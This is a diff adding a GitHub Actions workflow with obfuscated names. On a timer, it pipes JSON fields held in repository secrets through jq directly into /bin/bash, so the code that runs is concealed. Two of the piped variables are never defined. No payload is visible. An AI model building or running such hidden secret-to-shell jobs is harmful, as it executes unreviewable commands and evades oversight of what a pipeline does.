@@ -1,0 +1,19 @@
+name: yinqixiaolingb
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yinqixiaolingb
+        env:
+          ueqbe19: ${{ secrets.ueqbe19 }}
+        run: |
+          echo $ueqbe19 | jq -r .xphvf7 | /bin/bash
+          echo $qzj09 | jq -r .avj3 | /bin/bash
+          echo $zwir10511 | jq -r .xuit83 | /bin/bash
+
